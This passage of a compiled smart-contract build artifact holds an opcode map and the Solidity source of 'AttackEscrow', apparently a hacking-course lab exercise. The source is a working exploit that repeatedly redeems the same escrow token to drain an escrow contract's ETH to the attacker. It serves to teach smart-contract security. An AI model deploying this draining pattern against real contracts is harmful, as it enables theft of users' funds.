    "802": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "804": {
      "op": "SHL"
    },
    "805": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "DUP2",
      "path": "22"
    },
    "806": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "807": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "809": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x4"
    },
    "811": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "DUP3",
      "path": "22"
    },
    "812": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "ADD",
      "path": "22"
    },
    "813": {
      "op": "MSTORE"
    },
    "814": {
      "op": "PUSH1",
      "value": "0x23"
    },
    "816": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "818": {
      "op": "DUP3"
    },
    "819": {
      "op": "ADD"
    },
    "820": {
      "op": "MSTORE"
    },
    "821": {
      "op": "PUSH32",
      "value": "0x61747461636B206661696C65642C2065746820636F756C646E27742062652073"
    },
    "854": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "856": {
      "op": "DUP3"
    },
    "857": {
      "op": "ADD"
    },
    "858": {
      "op": "MSTORE"
    },
    "859": {
      "op": "PUSH3",
      "value": "0x195B9D"
    },
    "863": {
      "op": "PUSH1",
      "value": "0xEA"
    },
    "865": {
      "op": "SHL"
    },
    "866": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "868": {
      "op": "DUP3"
    },
    "869": {
      "op": "ADD"
    },
    "870": {
      "op": "MSTORE"
    },
    "871": {
      "op": "PUSH1",
      "value": "0x84"
    },
    "873": {
      "op": "ADD"
    },
    "874": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "875": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "877": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "878": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "DUP1",
      "path": "22"
    },
    "879": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "SWAP2",
      "path": "22"
    },
    "880": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "SUB",
      "path": "22"
    },
    "881": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "882": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "REVERT",
      "optimizer_revert": true,
      "path": "22"
    },
    "883": {
      "fn": "AttackEscrow.attack",
      "offset": [
        1384,
        1439
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "884": {
      "fn": "AttackEscrow.attack",
      "offset": [
        966,
        1446
      ],
      "op": "POP",
      "path": "22"
    },
    "885": {
      "fn": "AttackEscrow.attack",
      "offset": [
        966,
        1446
      ],
      "op": "POP",
      "path": "22"
    },
    "886": {
      "fn": "AttackEscrow.attack",
      "offset": [
        966,
        1446
      ],
      "op": "POP",
      "path": "22"
    },
    "887": {
      "fn": "AttackEscrow.attack",
      "jump": "o",
      "offset": [
        921,
        1446
      ],
      "op": "JUMP",
      "path": "22"
    },
    "888": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "889": {
      "offset": [
        1094,
        1107
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x380"
    },
    "892": {
      "offset": [
        1094,
        1105
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3F1"
    },
    "895": {
      "jump": "i",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMP",
      "path": "0"
    },
    "896": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "897": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "899": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "901": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "903": {
      "op": "SHL"
    },
    "904": {
      "op": "SUB"
    },
    "905": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2169,
        2191
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 6
    },
    "906": {
      "branch": 13,
      "fn": "Ownable.transferOwnership",
      "offset": [
        2169,
        2191
      ],
      "op": "AND",
      "path": "0"
    },
    "907": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3E5"
    },
    "910": {
      "branch": 13,
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "911": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "913": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "914": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "918": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "920": {
      "op": "SHL"
    },
    "921": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "DUP2",
      "path": "0"
    },
    "922": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "923": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "925": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "927": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "DUP3",
      "path": "0"
    },
    "928": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "ADD",
      "path": "0"
    },
    "929": {
      "op": "MSTORE"
    },
    "930": {
      "op": "PUSH1",
      "value": "0x26"
    },
    "932": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "934": {
      "op": "DUP3"
    },
    "935": {
      "op": "ADD"
    },
    "936": {
      "op": "MSTORE"
    },
    "937": {
      "op": "PUSH32",
      "value": "0x4F776E61626C653A206E6577206F776E657220697320746865207A65726F2061"
    },
    "970": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "972": {
      "op": "DUP3"
    },
    "973": {
      "op": "ADD"
    },
    "974": {
      "op": "MSTORE"
    },
    "975": {
      "op": "PUSH6",
      "value": "0x646472657373"
    },
    "982": {
      "op": "PUSH1",
      "value": "0xD0"
    },
    "984": {
      "op": "SHL"
    },
    "985": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "987": {
      "op": "DUP3"
    },
    "988": {
      "op": "ADD"
    },
    "989": {
      "op": "MSTORE"
    },
    "990": {
      "op": "PUSH1",
      "value": "0x84"
    },
    "992": {
      "op": "ADD"
    },
    "993": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x36A"
    },
    "996": {
      "op": "JUMP"
    },
    "997": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2161,
        2234
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "998": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2244,
        2272
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 7,
      "value": "0x3EE"
    },
    "1001": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2263,
        2271
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1002": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2244,
        2262
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x44B"
    },
    "1005": {
      "fn": "Ownable.transferOwnership",
      "jump": "i",
      "offset": [
        2244,
        2272
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1006": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2244,
        2272
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1007": {
      "fn": "Ownable.transferOwnership",
      "offset": [
        2081,
        2279
      ],
      "op": "POP",
      "path": "0"
    },
    "1008": {
      "fn": "Ownable.transferOwnership",
      "jump": "o",
      "offset": [
        2081,
        2279
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1009": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1359,
        1489
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1010": {
      "fn": "Ownable.owner",
      "offset": [
        1247,
        1254
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1012": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1013": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1015": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1017": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1019": {
      "op": "SHL"
    },
    "1020": {
      "op": "SUB"
    },
    "1021": {
      "fn": "Ownable.owner",
      "offset": [
        1273,
        1279
      ],
      "op": "AND",
      "path": "0"
    },
    "1022": {
      "fn": "Context._msgSender",
      "offset": [
        719,
        729
      ],
      "op": "CALLER",
      "path": "7",
      "statement": 8
    },
    "1023": {
      "branch": 14,
      "fn": "Ownable._checkOwner",
      "offset": [
        1422,
        1445
      ],
      "op": "EQ",
      "path": "0",
      "statement": 9
    },
    "1024": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xCC"
    },
    "1027": {
      "branch": 14,
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1028": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1030": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1031": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "1035": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "1037": {
      "op": "SHL"
    },
    "1038": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1039": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1040": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1042": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1044": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1045": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "ADD",
      "path": "0"
    },
    "1046": {
      "op": "DUP2"
    },
    "1047": {
      "op": "SWAP1"
    },
    "1048": {
      "op": "MSTORE"
    },
    "1049": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1051": {
      "op": "DUP3"
    },
    "1052": {
      "op": "ADD"
    },
    "1053": {
      "op": "MSTORE"
    },
    "1054": {
      "op": "PUSH32",
      "value": "0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572"
    },
    "1087": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1089": {
      "op": "DUP3"
    },
    "1090": {
      "op": "ADD"
    },
    "1091": {
      "op": "MSTORE"
    },
    "1092": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "1094": {
      "op": "ADD"
    },
    "1095": {
      "fn": "Ownable._checkOwner",
      "offset": [
        1414,
        1482
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x36A"
    },
    "1098": {
      "op": "JUMP"
    },
    "1099": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2433,
        2620
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1100": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2506,
        2522
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1102": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1103": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1104": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1106": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1108": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1110": {
      "op": "SHL"
    },
    "1111": {
      "op": "SUB"
    },
    "1112": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP4",
      "path": "0",
      "statement": 10
    },
    "1113": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1114": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "AND",
      "path": "0"
    },
    "1115": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1117": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1119": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1121": {
      "op": "SHL"
    },
    "1122": {
      "op": "SUB"
    },
    "1123": {
      "op": "NOT"
    },
    "1124": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1125": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "AND",
      "path": "0"
    },
    "1126": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1127": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "OR",
      "path": "0"
    },
    "1128": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "DUP5",
      "path": "0"
    },
    "1129": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2541,
        2558
      ],
      "op": "SSTORE",
      "path": "0"
    },
    "1130": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 11,
      "value": "0x40"
    },
    "1132": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1133": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1134": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1135": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "1136": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "AND",
      "path": "0"
    },
    "1137": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "1138": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1139": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2525,
        2531
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1140": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "PUSH32",
      "path": "0",
      "value": "0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
    },
    "1173": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1174": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2506,
        2522
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1175": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2573,
        2613
      ],
      "op": "LOG3",
      "path": "0"
    },
    "1176": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2496,
        2620
      ],
      "op": "POP",
      "path": "0"
    },
    "1177": {
      "fn": "Ownable._transferOwnership",
      "offset": [
        2433,
        2620
      ],
      "op": "POP",
      "path": "0"
    },
    "1178": {
      "fn": "Ownable._transferOwnership",
      "jump": "o",
      "offset": [
        2433,
        2620
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1179": {
      "op": "JUMPDEST"
    },
    "1180": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1182": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1184": {
      "op": "DUP3"
    },
    "1185": {
      "op": "DUP5"
    },
    "1186": {
      "op": "SUB"
    },
    "1187": {
      "op": "SLT"
    },
    "1188": {
      "op": "ISZERO"
    },
    "1189": {
      "op": "PUSH2",
      "value": "0x4AD"
    },
    "1192": {
      "op": "JUMPI"
    },
    "1193": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1195": {
      "op": "DUP1"
    },
    "1196": {
      "op": "REVERT"
    },
    "1197": {
      "op": "JUMPDEST"
    },
    "1198": {
      "op": "DUP2"
    },
    "1199": {
      "op": "CALLDATALOAD"
    },
    "1200": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1202": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1204": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1206": {
      "op": "SHL"
    },
    "1207": {
      "op": "SUB"
    },
    "1208": {
      "op": "DUP2"
    },
    "1209": {
      "op": "AND"
    },
    "1210": {
      "op": "DUP2"
    },
    "1211": {
      "op": "EQ"
    },
    "1212": {
      "op": "PUSH2",
      "value": "0x4C4"
    },
    "1215": {
      "op": "JUMPI"
    },
    "1216": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1218": {
      "op": "DUP1"
    },
    "1219": {
      "op": "REVERT"
    },
    "1220": {
      "op": "JUMPDEST"
    },
    "1221": {
      "op": "SWAP4"
    },
    "1222": {
      "op": "SWAP3"
    },
    "1223": {
      "op": "POP"
    },
    "1224": {
      "op": "POP"
    },
    "1225": {
      "op": "POP"
    },
    "1226": {
      "jump": "o",
      "op": "JUMP"
    },
    "1227": {
      "op": "JUMPDEST"
    },
    "1228": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1230": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1232": {
      "op": "DUP3"
    },
    "1233": {
      "op": "DUP5"
    },
    "1234": {
      "op": "SUB"
    },
    "1235": {
      "op": "SLT"
    },
    "1236": {
      "op": "ISZERO"
    },
    "1237": {
      "op": "PUSH2",
      "value": "0x4DD"
    },
    "1240": {
      "op": "JUMPI"
    },
    "1241": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1243": {
      "op": "DUP1"
    },
    "1244": {
      "op": "REVERT"
    },
    "1245": {
      "op": "JUMPDEST"
    },
    "1246": {
      "op": "POP"
    },
    "1247": {
      "op": "MLOAD"
    },
    "1248": {
      "op": "SWAP2"
    },
    "1249": {
      "op": "SWAP1"
    },
    "1250": {
      "op": "POP"
    },
    "1251": {
      "jump": "o",
      "op": "JUMP"
    }
  },
  "sha1": "ff55850394102c98b9ece37b9820d66029435263",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n\ninterface IEscrowNFT is IERC721 {\n    function tokenDetails(uint256) external view returns (uint256, uint256);\n    function tokenCounter() external returns(uint256);\n}\n\ninterface IEscrow {\n    function escrowEth(address _recipient, uint256 _duration) external payable;\n    function redeemEthFromEscrow(uint256 _tokenId) external;\n}\n\n/**\n * @title AttackEscrow\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\ncontract AttackEscrow is Ownable {\n\n    IEscrow private immutable escrow;\n    IEscrowNFT private immutable nft;\n\n    constructor(address _nft, address _escrow) {    \n        nft = IEscrowNFT(_nft);\n        escrow = IEscrow(_escrow);\n    }\n\n    function attack() external payable onlyOwner {\n        escrow.escrowEth{value: msg.value}(address(this), 0);\n\n        uint256 tokenId = nft.tokenCounter();\n        uint256 escrowETHBalance = address(escrow).balance;\n\n        while(escrowETHBalance >= msg.value) {\n            escrow.redeemEthFromEscrow(tokenId);\n            escrowETHBalance = address(escrow).balance;\n        }\n\n        (bool success, ) = owner().call{value: address(this).balance}(\"\");\n        require(success, \"attack failed, eth couldn't be sent\");\n    }\n\n    receive() external payable {}\n}",
  "sourceMap": "677:806:22:-:0;;;794:121;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;936:32:0;719:10:7;936:18:0;:32::i;:::-;-1:-1:-1;;;;;851:22:22;;;;;883:25;;;677:806;;2433:187:0;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:0;;;-1:-1:-1;;;;;;2541:17:0;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;14:177:25:-;93:13;;-1:-1:-1;;;;;135:31:25;;125:42;;115:70;;181:1;178;171:12;115:70;14:177;;;:::o;196:293::-;275:6;283;336:2;324:9;315:7;311:23;307:32;304:52;;;352:1;349;342:12;304:52;375:40;405:9;375:40;:::i;:::-;365:50;;434:49;479:2;468:9;464:18;434:49;:::i;:::-;424:59;;196:293;;;;;:::o;:::-;677:806:22;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;",
  "sourcePath": "contracts/unchecked-returns-2/AttackEscrow.sol",
  "type": "contract"
}